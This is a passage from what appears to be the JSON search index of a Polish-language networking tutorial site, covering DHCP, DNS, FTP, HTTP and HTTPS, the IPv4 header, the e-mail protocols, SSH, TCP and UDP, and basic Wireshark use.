urz\u0105dzenie u\u017cytkownika.</p>"},{"location":"networking/protocols/#dhcp-dynamic-host-configuration-protocol","title":"DHCP (Dynamic Host Configuration Protocol)","text":"<p>DHCP jest protoko\u0142em, kt\u00f3ry automatycznie przydziela adresy IP urz\u0105dzeniom w sieci. Dzi\u0119ki DHCP, administratorzy sieci nie musz\u0105 r\u0119cznie konfigurowa\u0107 adres\u00f3w IP dla ka\u017cdego urz\u0105dzenia w sieci.</p>"},{"location":"networking/protocols/#ssh-secure-shell","title":"SSH (Secure Shell)","text":"<p>SSH to protok\u00f3\u0142 sieciowy wykorzystywany do zdalnej obs\u0142ugi system\u00f3w operacyjnych przez sie\u0107. Umo\u017cliwia bezpieczne logowanie do zdalnych system\u00f3w, wykonywanie polece\u0144, przesy\u0142anie plik\u00f3w oraz przekierowywanie port\u00f3w.</p>"},{"location":"networking/protocols/dhcp/","title":"DHCP (Dynamic Host Configuration Protocol)","text":"<p>DHCP to protok\u00f3\u0142 sieciowy u\u017cywany w sieciach IP, kt\u00f3ry umo\u017cliwia automatyczn\u0105 konfiguracj\u0119 parametr\u00f3w sieciowych dla urz\u0105dze\u0144 klienta. Zosta\u0142 zaprojektowany, aby u\u0142atwi\u0107 zarz\u0105dzanie i konfiguracj\u0119 urz\u0105dze\u0144 w sieci, eliminuj\u0105c potrzeb\u0119 r\u0119cznego przypisywania adres\u00f3w IP.</p> <p>Protok\u00f3\u0142 DHCP dzia\u0142a w modelu klient-serwer. Serwer przechowuje pul\u0119 dost\u0119pnych adres\u00f3w IP i informacje konfiguracyjne dla klient\u00f3w. Kiedy urz\u0105dzenie (klient DHCP) do\u0142\u0105cza do sieci, wysy\u0142a \u017c\u0105danie do serwera DHCP o przyznanie adresu IP i innych informacji konfiguracyjnych. Serwer odpowiada na to \u017c\u0105danie przypisuj\u0105c urz\u0105dzeniu unikalny adres IP i dostarczaj\u0105c mu niezb\u0119dne informacje konfiguracyjne.</p> <p>Informacje konfiguracyjne dostarczane przez serwer DHCP mog\u0105 obejmowa\u0107:</p> <ul> <li>Adres IP.</li> <li>Mask\u0119 podsieci.</li> <li>Adres domy\u015blnej bramy.</li> <li>Adresy serwer\u00f3w DNS.</li> <li>Adresy serwer\u00f3w WINS (Windows Internet Name Service).</li> <li>Czas dzier\u017cawy adresu IP.</li> </ul> <p>Czas dzier\u017cawy okre\u015bla, jak d\u0142ugo urz\u0105dzenie klienta mo\u017ce korzysta\u0107 z przypisanego mu adresu IP. Po up\u0142ywie tego czasu urz\u0105dzenie musi odnowi\u0107 swoj\u0105 dzier\u017caw\u0119 lub otrzyma\u0107 nowy adres IP.</p> <p>DHCP jest niezb\u0119dny w du\u017cych sieciach, gdzie r\u0119czne zarz\u0105dzanie adresami IP by\u0142oby bardzo czasoch\u0142onne i podatne na b\u0142\u0119dy. U\u0142atwia zarz\u0105dzanie adresami IP, automatyzuje proces konfiguracji urz\u0105dze\u0144 sieciowych, a tak\u017ce pomaga w zapobieganiu konfliktom adres\u00f3w IP.</p>"},{"location":"networking/protocols/dhcp/#konflikt-adresow-ip","title":"Konflikt adres\u00f3w IP","text":"<p>Konflikt adres\u00f3w IP wyst\u0119puje, gdy dwa lub wi\u0119cej urz\u0105dze\u0144 w tej samej sieci jest skonfigurowanych z tym samym adresem IP. Takie zdarzenie jest problematyczne, poniewa\u017c adresy IP musz\u0105 by\u0107 unikalne dla ka\u017cdego urz\u0105dzenia w sieci, aby umo\u017cliwi\u0107 prawid\u0142ow\u0105 komunikacj\u0119.</p> <p>Gdy do konfliktu dojdzie, mo\u017ce to spowodowa\u0107 r\u00f3\u017cnego rodzaju problemy z komunikacj\u0105 sieciow\u0105. Mo\u017ce zdarzy\u0107 si\u0119, \u017ce urz\u0105dzenia z tym samym adresem IP nie b\u0119d\u0105 w stanie nawi\u0105za\u0107 prawid\u0142owego po\u0142\u0105czenia sieciowego, co prowadzi do b\u0142\u0119d\u00f3w i awarii w komunikacji. W najgorszym przypadku wszystkie urz\u0105dzenia z tym samym adresem IP mog\u0105 by\u0107 niedost\u0119pne dla reszty sieci.</p> <p>Konflikty adres\u00f3w IP mog\u0105 wynika\u0107 z r\u00f3\u017cnych sytuacji, takich jak:</p> <ul> <li>R\u0119czne przypisanie tego samego adresu IP r\u00f3\u017cnym urz\u0105dzeniom przez administratora sieci.</li> <li>B\u0142\u0105d w konfiguracji serwera DHCP, kt\u00f3ry przydziela ten sam adres IP r\u00f3\u017cnym klientom.</li> <li>Urz\u0105dzenie, kt\u00f3re jest skonfigurowane na sta\u0142y adres IP, do\u0142\u0105cza do sieci, w kt\u00f3rej serwer DHCP przydzieli\u0142 ju\u017c ten adres innemu urz\u0105dzeniu.</li> <li>Urz\u0105dzenie zaczyna korzysta\u0107 z adresu IP, kt\u00f3ry by\u0142 wcze\u015bniej przydzielony innemu urz\u0105dzeniu, ale nie zosta\u0142 prawid\u0142owo zwolniony.</li> </ul> <p>Protok\u00f3\u0142 DHCP jest zaprojektowany tak, aby minimalizowa\u0107 ryzyko konflikt\u00f3w adres\u00f3w IP poprzez dynamiczne zarz\u0105dzanie pul\u0105 dost\u0119pnych adres\u00f3w IP i przydzielanie ich urz\u0105dzeniom na zasadzie dzier\u017cawy.</p>"},{"location":"networking/protocols/dns/","title":"DNS (Domain Name System)","text":"<p>DNS to jeden z najwa\u017cniejszych protoko\u0142\u00f3w w Internecie, kt\u00f3ry umo\u017cliwia przek\u0142adanie nazw domenowych na adresy IP. Bez DNS u\u017cytkownicy musieliby pami\u0119ta\u0107 numeryczne adresy IP stron internetowych, zamiast \u0142atwiej zapadaj\u0105cych w pami\u0119\u0107 nazw domenowych.</p> <p>DNS dzia\u0142a na zasadzie hierarchicznej struktury. Na samym szczycie tej hierarchii s\u0105 tzw. serwery g\u0142\u00f3wne (ang. root servers), kt\u00f3re znaj\u0105 lokalizacje wszystkich serwer\u00f3w obs\u0142uguj\u0105cych poszczeg\u00f3lne domeny najwy\u017cszego poziomu (takie jak .com, .org, .pl, itp.).</p> <p>Gdy u\u017cytkownik wprowadza adres URL w przegl\u0105darce internetowej, zapytanie to jest najpierw przekierowywane do serwera DNS skonfigurowanego dla sieci tego u\u017cytkownika (cz\u0119sto jest to serwer DNS dostawcy us\u0142ug internetowych). Je\u015bli ten serwer DNS nie ma informacji o adresie IP dla tej domeny, przekazuje zapytanie do wy\u017cszego serwera DNS. Proces ten kontynuuje si\u0119 a\u017c do serwera g\u0142\u00f3wnego, kt\u00f3ry zna serwery obs\u0142uguj\u0105ce domen\u0119 najwy\u017cszego poziomu, i tak dalej, a\u017c osi\u0105gni\u0119ty zostanie serwer obs\u0142uguj\u0105cy konkretn\u0105 domen\u0119.</p> <p>Podczas tego procesu ka\u017cdy serwer DNS, kt\u00f3ry otrzymuje odpowied\u017a, zapisuje j\u0105 na pewien czas (tzw. TTL - Time to Live), dzi\u0119ki czemu w przysz\u0142o\u015bci mo\u017ce odpowiada\u0107 na zapytania dotycz\u0105ce tej samej domeny bez potrzeby ponownego odpytywania ca\u0142ego \u0142a\u0144cucha serwer\u00f3w DNS.</p> <p>DNS jest niezwykle istotnym elementem Internetu, poniewa\u017c bez niego nawigowanie po sieci by\u0142oby znacznie bardziej skomplikowane i mniej intuicyjne. Ponadto, DNS zapewnia wiele innych us\u0142ug, takich jak przekierowywanie poczty e-mail do odpowiednich serwer\u00f3w lub obs\u0142uga poddomen.</p>"},{"location":"networking/protocols/ftp/","title":"FTP (File Transfer Protocol)","text":"<p>FTP, czyli Protok\u00f3\u0142 Przesy\u0142ania Plik\u00f3w, to standardowy protok\u00f3\u0142 komunikacyjny wykorzystywany do przesy\u0142ania plik\u00f3w pomi\u0119dzy komputerami w sieci internetowej. Jest cz\u0119sto wykorzystywany do przesy\u0142ania plik\u00f3w na serwery internetowe oraz do udost\u0119pniania plik\u00f3w do pobrania przez u\u017cytkownik\u00f3w Internetu.</p> <p>FTP dzia\u0142a na podstawie modelu klient-serwer. Klient \u0142\u0105czy si\u0119 z serwerem, a nast\u0119pnie wysy\u0142a \u017c\u0105dania o przes\u0142anie plik\u00f3w lub pobranie plik\u00f3w z serwera. Serwer odbiera te \u017c\u0105dania i wykonuje odpowiednie akcje.</p> <p>Podstawowe operacje, kt\u00f3re mo\u017cna wykona\u0107 za pomoc\u0105 protoko\u0142u FTP, to:</p> <ul> <li>Przesy\u0142anie plik\u00f3w na serwer (upload).</li> <li>Pobieranie plik\u00f3w z serwera (download).</li> <li>Przegl\u0105danie zawarto\u015bci katalog\u00f3w na serwerze.</li> <li>Tworzenie i usuwanie katalog\u00f3w na serwerze.</li> <li>Kasowanie plik\u00f3w na serwerze.</li> </ul> <p>FTP posiada dwa tryby pracy: aktywny i pasywny. W trybie aktywnym to serwer FTP inicjuje po\u0142\u0105czenie z klientem FTP na porcie danych. W trybie pasywnym to klient FTP inicjuje po\u0142\u0105czenie z serwerem na porcie danych. Tryb pasywny jest cz\u0119\u015bciej wykorzystywany, poniewa\u017c lepiej wsp\u00f3\u0142pracuje z zaporami ogniowymi i routerami.</p> <p>Warning</p> <p>Standardowy protok\u00f3\u0142 FTP nie jest bezpieczny. Komunikacja odbywa si\u0119 bez szyfrowania, co oznacza, \u017ce nazwy u\u017cytkownik\u00f3w, has\u0142a, komendy i przesy\u0142ane pliki mog\u0105 by\u0107 przechwycone i odczytane. Dlatego te\u017c zaleca si\u0119 stosowanie FTPS (FTP Secure), kt\u00f3ry dodaje warstw\u0119 szyfrowania SSL/TLS do po\u0142\u0105czenia, lub SFTP (SSH File Transfer Protocol), kt\u00f3ry wykorzystuje bezpieczny protok\u00f3\u0142 SSH do przesy\u0142ania plik\u00f3w.</p>"},{"location":"networking/protocols/http-https/","title":"HTTP i HTTPS","text":""},{"location":"networking/protocols/http-https/#http-hypertext-transfer-protocol","title":"HTTP (Hypertext Transfer Protocol)","text":"<p>HTTP, czyli protok\u00f3\u0142 przesy\u0142ania hipertekstu, to zestaw regu\u0142 komunikacyjnych u\u017cywanych do przesy\u0142ania informacji w sieciach komputerowych, zw\u0142aszcza w Internecie. Jest protoko\u0142em nieszyfrowanym, co oznacza, \u017ce przesy\u0142ane informacje mog\u0105 by\u0107 odczytane, je\u015bli zostan\u0105 przechwycone.</p> <p>HTTP jest protoko\u0142em bezstanowym. Oznacza to, \u017ce nie zachowuje on \u017cadnych informacji mi\u0119dzy \u017c\u0105daniami. Ka\u017cde \u017c\u0105danie jest niezale\u017cne i nie ma \u015bwiadomo\u015bci poprzednich \u017c\u0105da\u0144. Protok\u00f3\u0142 HTTP dzia\u0142a na podstawie modelu \u017c\u0105danie-odpowied\u017a. Klient (zazwyczaj przegl\u0105darka internetowa) wysy\u0142a \u017c\u0105danie do serwera, a serwer zwraca odpowied\u017a.</p>"},{"location":"networking/protocols/http-https/#podstawowe-typy-zapytan-http","title":"Podstawowe typy zapyta\u0144 HTTP","text":"<ul> <li>GET: \u017c\u0105danie pobrania informacji.</li> <li>POST: przes\u0142anie danych do serwera.</li> <li>PUT: aktualizacja danych na serwerze.</li> <li>DELETE: usuni\u0119cie danych na serwerze.</li> </ul>"},{"location":"networking/protocols/http-https/#kody-odpowiedzi-http","title":"Kody odpowiedzi HTTP","text":"<p>Kody odpowiedzi HTTP to trzycyfrowe numery wysy\u0142ane przez serwer jako odpowied\u017a na \u017c\u0105danie klienta. Pomagaj\u0105 w identyfikacji rezultatu \u017c\u0105dania i wskazuj\u0105, czy \u017c\u0105danie zako\u0144czy\u0142o si\u0119 sukcesem, czy te\u017c nie.</p> <p>Kody odpowiedzi HTTP s\u0105 podzielone na pi\u0119\u0107 klas, zidentyfikowanych przez pierwsz\u0105 cyfr\u0119:</p> <ul> <li>1xx (Informatywne): Rzadko u\u017cywane. Informuj\u0105, \u017ce \u017c\u0105danie zosta\u0142o odebrane i proces kontynuowany.</li> <li>2xx (Sukces): Oznaczaj\u0105, \u017ce \u017c\u0105danie zosta\u0142o pomy\u015blnie otrzymane, zrozumiane i przyj\u0119te.</li> <li>200 OK: Standardowa odpowied\u017a na prawid\u0142owe \u017c\u0105dania.</li> <li>201 Created: \u017b\u0105danie zosta\u0142o spe\u0142nione, a w wyniku tego utworzono nowy zas\u00f3b.</li> <li>204 No Content: \u017b\u0105danie zosta\u0142o pomy\u015blnie przetworzone, ale nie ma dodatkowych informacji do wys\u0142ania.</li> <li>3xx (Przekierowanie): Informuj\u0105 klienta, \u017ce musi podj\u0105\u0107 dodatkow\u0105 akcj\u0119, aby zako\u0144czy\u0107 \u017c\u0105danie.</li> <li>301 Moved Permanently: Ta i wszystkie przysz\u0142e pro\u015bby powinny by\u0107 kierowane do podanego URI.</li> <li>302 Found: Ta odpowied\u017a m\u00f3wi, \u017ce \u017c\u0105dane zasoby znajduj\u0105 si\u0119 tymczasowo pod innym URI.</li> <li>4xx (B\u0142\u0105d klienta): Zwracane, gdy \u017c\u0105danie nie mo\u017ce by\u0107 zako\u0144czone z powodu b\u0142\u0119du po stronie klienta.</li> <li>400 Bad Request: Serwer nie by\u0142 w stanie zrozumie\u0107 \u017c\u0105dania z powodu niepoprawnej sk\u0142adni.</li> <li>403 Forbidden: Klient nie ma uprawnie\u0144 do dost\u0119pu do \u017c\u0105danego zasobu.</li> <li>404 Not Found: Serwer nie mo\u017ce odnale\u017a\u0107 \u017c\u0105danego zasobu.</li> <li>5xx (B\u0142\u0105d serwera): Zwracane, gdy serwer napotka\u0142 problem, ale nie mo\u017ce go precyzyjnie zidentyfikowa\u0107.</li> <li>500 Internal Server Error: Niespecyficzny b\u0142\u0105d serwera.</li> <li>502 Bad Gateway: Serwer dzia\u0142a jako brama lub proxy i otrzyma\u0142 niepoprawn\u0105 odpowied\u017a od g\u00f3rnego serwera.</li> <li>503 Service Unavailable: Serwer nie jest w stanie obs\u0142u\u017cy\u0107 \u017c\u0105dania z powodu przeci\u0105\u017cenia lub konserwacji.</li> </ul> <p>Powy\u017csze kody to tylko niekt\u00f3re z wielu kod\u00f3w odpowiedzi HTTP. Ka\u017cdy kod przekazuje wa\u017cne informacje o statusie \u017c\u0105dania i pomaga identyfikowa\u0107 problemy, kt\u00f3re mog\u0105 wyst\u0105pi\u0107 podczas komunikacji mi\u0119dzy klientem a serwerem.</p>"},{"location":"networking/protocols/http-https/#https-hypertext-transfer-protocol-secure","title":"HTTPS (Hypertext Transfer Protocol Secure)","text":"<p>HTTPS to rozszerzenie protoko\u0142u HTTP, kt\u00f3re dodaje warstw\u0119 bezpiecze\u0144stwa do transmisji danych. HTTPS u\u017cywa protoko\u0142u SSL (Secure Sockets Layer) lub TLS (Transport Layer Security) do szyfrowania komunikacji, co zapewnia bezpiecze\u0144stwo transmisji danych.</p> <p>G\u0142\u00f3wnym celem HTTPS jest zapewnienie prywatno\u015bci i bezpiecze\u0144stwa w komunikacji sieciowej. Szyfrowanie danych zapobiega przechwyceniu i modyfikacji danych przez osoby trzecie. Dzi\u0119ki temu protoko\u0142owi, informacje takie jak dane logowania, dane kart kredytowych czy inne poufne dane mog\u0105 by\u0107 bezpiecznie przesy\u0142ane przez Internet. W zwi\u0105zku z tym HTTPS jest szczeg\u00f3lnie wa\u017cny na stronach internetowych, kt\u00f3re obs\u0142uguj\u0105 transakcje finansowe, logowanie lub przetwarzanie innych wra\u017cliwych danych.</p> <p>W przegl\u0105darkach internetowych, strony korzystaj\u0105ce z protoko\u0142u HTTPS s\u0105 zazwyczaj oznaczone ikon\u0105 k\u0142\u00f3dki obok adresu URL, co sygnalizuje u\u017cytkownikom, \u017ce ich po\u0142\u0105czenie jest bezpieczne.</p> <p>Warning</p> <p>Pami\u0119taj, \u017ce nawet je\u015bli strona korzysta z protoko\u0142u HTTPS, to nie oznacza, \u017ce jest ona ca\u0142kowicie bezpieczna. Zawsze warto korzysta\u0107 z najnowszych wersji przegl\u0105darek internetowych, oprogramowania antywirusowego i dwusk\u0142adnikowego uwierzytelniania, aby zapewni\u0107 sobie najwy\u017cszy poziom ochrony.</p>"},{"location":"networking/protocols/ip/","title":"Protok\u00f3\u0142 IP","text":"<p>Protok\u00f3\u0142 komunikacyjny warstwy sieciowej modelu OSI. Okre\u015bla format i spos\u00f3b przesy\u0142ania danych przez sie\u0107.</p>"},{"location":"networking/protocols/ip/#nagowek-ipv4","title":"Nag\u0142\u00f3wek IPv4","text":"<p>Pocz\u0105tkowe dane (bajty) ka\u017cdego pakietu IPv4 to nag\u0142\u00f3wek:</p> <p></p> <ul> <li>Wersja \u2013 w tym polu nag\u0142\u00f3wka znajduje si\u0119 wersja protoko\u0142u IP, w przypadku IPv4 znajduje si\u0119 tam cyfra 4.</li> <li>D\u0142ugo\u015b\u0107 nag\u0142\u00f3wka (IHL) \u2013 d\u0142ugo\u015b\u0107 nag\u0142\u00f3wka pakietu IP wyra\u017cona w postaci liczby czterobajtowych cz\u0119\u015bci.</li> <li>Typ us\u0142ugi \u2013 okre\u015bla priorytet pakietu.</li> <li>D\u0142ugo\u015b\u0107 ca\u0142kowita \u2013 pole zawiera ca\u0142kowit\u0105 d\u0142ugo\u015b\u0107 pakietu (nag\u0142\u00f3wek + dane), maksymalna d\u0142ugo\u015b\u0107 pakietu to 65535 bajt\u00f3w.</li> <li>Numer identyfikacyjny \u2013 pole zawiera unikatowy identyfikator dla ka\u017cdego pakietu wykorzystywany do po\u0142\u0105czenia pakiet\u00f3w w strumie\u0144 danych.</li> <li>Flagi \u2013 okre\u015bla mi\u0119dzy innymi czy pakiet mo\u017ce by\u0107 fragmentowany.</li> <li>Kontrola przesuni\u0119cia \u2013 umo\u017cliwia z\u0142o\u017cenie pakietu w ca\u0142o\u015b\u0107 pakietu, okre\u015blaj\u0105 miejsce danego fragmentu w ca\u0142ym pakiecie.</li> <li>Czas \u017cycia pakietu (TTL \u2013 Time To Live) \u2013 ilo\u015b\u0107 przeskok\u00f3w przez kt\u00f3re mo\u017ce pakiet przej\u015b\u0107 zanim zostanie odrzucony (urz\u0105dzenia przez kt\u00f3re przechodzi dany pakiet zmniejszaj\u0105 t\u0105 warto\u015b\u0107 o 1).</li> <li>Protok\u00f3\u0142 warstwy wy\u017cszej\u2013 to pole zawiera informacje jaki protok\u00f3\u0142 warstwy transportowej zosta\u0142 wykorzystany (TCP, UDP, ICMP lub inne).</li> <li>Suma kontrolna nag\u0142\u00f3wka \u2013 gdy odbiorca dostanie pakiet, sprawdza jego poprawno\u015b\u0107 obliczaj\u0105c sum\u0119 kontroln\u0105 i por\u00f3wnuj\u0105c j\u0105 z sum\u0105 kontroln\u0105 zapisan\u0105 w nag\u0142\u00f3wku.</li> <li>Adres \u017ar\u00f3d\u0142owy i adres docelowy \u2013 zawieraj\u0105 adresy IP urz\u0105dze\u0144 kt\u00f3re przesy\u0142aj\u0105 mi\u0119dzy sob\u0105 dane zapisane w formacie binarnym.</li> </ul>"},{"location":"networking/protocols/smtp-pop3-imap/","title":"Protoko\u0142y komunikacji e-mail","text":""},{"location":"networking/protocols/smtp-pop3-imap/#smtp-simple-mail-transfer-protocol","title":"SMTP (Simple Mail Transfer Protocol)","text":"<p>SMTP, czyli Protok\u00f3\u0142 Prostej Transmisji Poczty, jest standardem internetowym do transmisji wiadomo\u015bci e-mail. Zosta\u0142 zaprojektowany do wysy\u0142ania wiadomo\u015bci z serwera pocztowego do serwera pocztowego. Jest wykorzystywany do komunikacji mi\u0119dzy serwerami, ale mo\u017ce by\u0107 r\u00f3wnie\u017c wykorzystany do komunikacji mi\u0119dzy klientem a serwerem poczty.</p> <p>G\u0142\u00f3wna wada tego protoko\u0142u polega na tym, \u017ce nie umo\u017cliwia on pobierania wiadomo\u015bci e-mail z serwera. Z tego powodu, SMTP jest cz\u0119sto u\u017cywany w parze z innymi protoko\u0142ami, takimi jak POP3 lub IMAP.</p>"},{"location":"networking/protocols/smtp-pop3-imap/#pop3-post-office-protocol","title":"POP3 (Post Office Protocol)","text":"<p>POP3, czyli Protok\u00f3\u0142 Pocztowy, jest standardem internetowym s\u0142u\u017c\u0105cym do pobierania wiadomo\u015bci e-mail z serwera pocztowego. Wiadomo\u015bci s\u0105 pobierane z serwera do lokalnej skrzynki odbiorczej i usuwane z serwera, chyba \u017ce u\u017cytkownik zdecyduje inaczej.</p> <p>Najwi\u0119kszym ograniczeniem tego protoko\u0142u jest brak mo\u017cliwo\u015bci synchronizacji mi\u0119dzy r\u00f3\u017cnymi urz\u0105dzeniami. Je\u015bli na przyk\u0142ad pobierzesz wiadomo\u015b\u0107 na komputer, nie zobaczysz jej na smartfonie. Z tego powodu, POP3 jest teraz rzadziej stosowany ni\u017c IMAP.</p>"},{"location":"networking/protocols/smtp-pop3-imap/#imap-internet-message-access-protocol","title":"IMAP (Internet Message Access Protocol)","text":"<p>IMAP, czyli Protok\u00f3\u0142 Dost\u0119pu do Wiadomo\u015bci Internetowych, jest standardem internetowym do zarz\u0105dzania wiadomo\u015bciami e-mail na serwerze. W przeciwie\u0144stwie do POP3, kt\u00f3ry pobiera wiadomo\u015bci z serwera, IMAP przechowuje wiadomo\u015bci na serwerze i synchronizuje je mi\u0119dzy r\u00f3\u017cnymi urz\u0105dzeniami. Dzi\u0119ki temu, mo\u017cesz przegl\u0105da\u0107 swoje wiadomo\u015bci e-mail na dowolnym urz\u0105dzeniu z dost\u0119pem do Internetu.</p> <p>IMAP umo\u017cliwia r\u00f3wnie\u017c organizowanie wiadomo\u015bci w foldery na serwerze, co u\u0142atwia zarz\u0105dzanie poczt\u0105. Ponadto, wszystkie dzia\u0142ania takie jak przenoszenie, kasowanie czy oznaczanie wiadomo\u015bci jako przeczytane s\u0105 synchronizowane na wszystkich urz\u0105dzeniach.</p> <p>Warning</p> <p>Pami\u0119taj, \u017ce zar\u00f3wno SMTP, POP3, jak i IMAP s\u0105 protoko\u0142ami nieszyfrowanymi. Oznacza to, \u017ce twoje wiadomo\u015bci mog\u0105 by\u0107 przechwycone i odczytane. Dlatego wiele us\u0142ug pocztowych oferuje zabezpieczone wersje tych protoko\u0142\u00f3w (SMTPS, POP3S, IMAPS), kt\u00f3re u\u017cywaj\u0105 SSL lub TLS do szyfrowania komunikacji.</p>"},{"location":"networking/protocols/ssh/","title":"SSH (Secure Shell)","text":"<p>SSH, czyli Bezpieczna Pow\u0142oka, to protok\u00f3\u0142 sieciowy wykorzystywany do zdalnej obs\u0142ugi system\u00f3w operacyjnych przez sie\u0107. Umo\u017cliwia bezpieczne logowanie do zdalnych system\u00f3w, wykonywanie polece\u0144, przesy\u0142anie plik\u00f3w oraz przekierowywanie port\u00f3w.</p> <p>Najwa\u017cniejsz\u0105 cech\u0105 protoko\u0142u SSH jest bezpiecze\u0144stwo. Wszystkie dane przesy\u0142ane przez sie\u0107, w tym has\u0142a i informacje osobiste, s\u0105 szyfrowane. SSH zapewnia r\u00f3wnie\u017c mechanizmy uwierzytelniania, kt\u00f3re chroni\u0105 przed atakami typu man-in-the-middle.</p> <p>Protok\u00f3\u0142 SSH jest szeroko wykorzystywany w administracji systemami, programowaniu i innym rodzajach zdalnej pracy. SSH jest niezwykle popularny w systemach Unix i Linux, ale jest r\u00f3wnie\u017c dost\u0119pny dla innych system\u00f3w operacyjnych, takich jak Windows.</p> <p>Opr\u00f3cz bezpiecznej pow\u0142oki zdalnej, SSH oferuje r\u00f3wnie\u017c inne funkcje, takie jak SFTP (SSH File Transfer Protocol) do bezpiecznego przesy\u0142ania plik\u00f3w oraz tunelowanie SSH, kt\u00f3re pozwala na przekierowywanie ruchu sieciowego.</p> <p>Info</p> <p>Podczas korzystania z SSH wa\u017cne jest pami\u0119tanie o bezpiecznym zarz\u0105dzaniu kluczami SSH. Klucze te s\u0105 u\u017cywane do uwierzytelniania na serwerze SSH i powinny by\u0107 odpowiednio chronione przed dost\u0119pem os\u00f3b niepowo\u0142anych.</p>"},{"location":"networking/protocols/tcp-udp/","title":"TCP i UDP","text":"<p>Protoko\u0142y UPD i TCP s\u0105 wykorzystywane do przesy\u0142ania danych - czyli pakiet\u00f3w informacji - przez Internet, korzystaj\u0105c z protoko\u0142u IP.</p>"},{"location":"networking/protocols/tcp-udp/#tcp","title":"TCP","text":"<p>Transmission Control Protocol jest protoko\u0142em po\u0142\u0105czeniowym. Gdy maszyna A wysy\u0142a dane do maszyny B, maszyna B jest informowana o nadchodz\u0105cych danych, po czym przesy\u0142a potwierdzenie ich odbioru.</p> <p>Przyk\u0142adowe zastosowania: e-mail, przegl\u0105danie sieci.</p>"},{"location":"networking/protocols/tcp-udp/#udp","title":"UDP","text":"<p>User Datagram Protocol to protok\u00f3\u0142 bezpo\u0142\u0105czeniowy. M\u00f3wi\u0105c najpro\u015bciej, gdy maszyna A wysy\u0142a pakiety do maszyny B, strumie\u0144 jest niekierowany. Oznacza to, \u017ce transmisja danych odbywa si\u0119 bez informowania odbiorcy (maszyny B), a odbiorca otrzymuje dane bez konieczno\u015bci wysy\u0142ania potwierdzenia do nadawcy danych (maszyny A).</p> <p>Przyk\u0142adowe zastosowania: rozmowy wideo, strumieniowanie muzyki.</p>"},{"location":"networking/protocols/tcp-udp/#tcp-vs-udp","title":"TCP vs UDP","text":"TCP UDP Po\u0142\u0105czeniowy Bezpo\u0142\u0105czeniowy Strumie\u0144 bajt\u00f3w Strumie\u0144 wiadomo\u015bci Unicast Unicast, Multicast, Broadcast Kontrola przep\u0142ywu i b\u0142\u0119d\u00f3w Brak kontroli Pakiet nazywany segmentem Pakiet nazywany datagramem"},{"location":"networking/protocols/tcp-udp/#schematy-przesyania-danych","title":"Schematy przesy\u0142ania danych","text":"<p>Wiadomo\u015bci w sieci mog\u0105 by\u0107 przesy\u0142ane na wiele sposob\u00f3w. Poni\u017cej om\u00f3wione s\u0105 najwa\u017cniejsze z nich.</p>"},{"location":"networking/protocols/tcp-udp/#unicast","title":"Unicast","text":"<p>Komunikacja typu jeden-do-jeden. Z jednego miejsca w sieci do innego, to znaczy jeden nadawca i jeden odbiorca. Mo\u017cna to por\u00f3wna\u0107 do prywatnej rozmowy dw\u00f3ch os\u00f3b.</p> <p></p>"},{"location":"networking/protocols/tcp-udp/#multicast","title":"Multicast","text":"<p>Komunikacja grupowa typu jeden-do-wielu. Wiadomo\u015b\u0107 jest wysy\u0142ana do grupy urz\u0105dze\u0144 w sieci jednocze\u015bnie. Mo\u017cna to przyr\u00f3wna\u0107 do rozmowy z grup\u0105 znajomych.</p> <p></p>"},{"location":"networking/protocols/tcp-udp/#broadcast","title":"Broadcast","text":"<p>Komunikacja typu jeden-do-wszystkich. Wiadomo\u015b\u0107 wysy\u0142ana jest do wszystkich urz\u0105dze\u0144 w sieci. Mo\u017cna to por\u00f3wna\u0107 do wyg\u0142oszenia przem\u00f3wienia na \u015brodku placu.</p> <p></p>"},{"location":"networking/wireshark/","title":"Wireshark","text":"<p>Wireshark to otwarte oprogramowanie do analizy protoko\u0142\u00f3w sieciowych, u\u017cywane do rozwi\u0105zywania problem\u00f3w w sieciach komputerowych, analizy i rozwoju protoko\u0142\u00f3w oraz nauki.</p> <p>Za pomoc\u0105 Wiresharka u\u017cytkownicy mog\u0105 przechwytywa\u0107 i interaktywnie przegl\u0105da\u0107 ruch pakiet\u00f3w w sieci. To narz\u0119dzie jest zdolne do analizy setek r\u00f3\u017cnych protoko\u0142\u00f3w sieciowych.</p> <p>Wireshark jest dost\u0119pny na wiele platform, takich jak Windows, macOS, Linux i inne systemy uniksowe. Interfejs u\u017cytkownika oferuje szczeg\u00f3\u0142owy przegl\u0105d pakiet\u00f3w, a zaawansowane funkcje obejmuj\u0105 mo\u017cliwo\u015b\u0107 tworzenia statystyk, filtr\u00f3w, kolorowania pakiet\u00f3w i wiele innych.</p> <p>Wireshark jest cz\u0119sto stosowany przez administrator\u00f3w sieci do rozwi\u0105zywania problem\u00f3w z sieci\u0105 i rozumienia ruchu sieciowego. Dzi\u0119ki temu narz\u0119dziu mo\u017cna zrozumie\u0107, co dzieje si\u0119 \"pod spodem\" w sieci, co jest nieocenione w rozwi\u0105zywaniu problem\u00f3w i badaniu zagadnie\u0144 zwi\u0105zanych z sieciami komputerowymi.</p>"},{"location":"networking/wireshark/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"networking/wireshark/http/","title":"HTTP","text":""},{"location":"networking/wireshark/http/#odczytanie-nagowka-http-przykad","title":"Odczytanie nag\u0142\u00f3wka HTTP - przyk\u0142ad","text":"<p>Powiedzmy, \u017ce analizujemy przedstawion\u0105 poni\u017cej odpowied\u017a na zapytanie http GET.</p> <p></p> <p>Program Wireshark pokazuje nam pokazan\u0105 poni\u017cesz zawarto\u015b\u0107 pakietu i nag\u0142\u00f3wka http.</p> <p></p> <p>Przedstawmy najwa\u017cniejsze pola nag\u0142\u00f3wka http w formie uproszczonej tabelki (je\u017celi chcieliby\u015bmy by\u0107 bardzo dok\u0142adni, to powinni\u015bmy przepisa\u0107 wszystkie pola, ale skupimy si\u0119 tylko na cz\u0119\u015bci z nich).</p> <p></p> <p>Teraz wype\u0142nijmy tabelk\u0119 tre\u015bci\u0105. Pierwsza warto\u015b\u0107 (response line) to odpowied\u017a serwera, czyli pierwsza linia, jak\u0105 pokazuje Wireshark w nag\u0142\u00f3wku http: HTTP/1.1 200 OK (znaki \\r oraz \\n to kody bia\u0142ych znak\u00f3w, czyli np. znaku nowej linii, nie trzeba ich przepisywa\u0107). Pozosta\u0142e warto\u015bci przepisujemy (kopiujemy) bezpo\u015brednio z Wiresharka.</p> <p></p>"},{"location":"networking/wireshark/https/","title":"Po\u0142\u0105czenia HTTPS","text":"<p>Podczas nas\u0142uchiwania po\u0142\u0105cze\u0144 szyfrowanych HTTPS w programie Wireshark nie zobaczymy szczeg\u00f3\u0142\u00f3w pobieranych danych, np. kodu pobieranej strony, poniewa\u017c dane 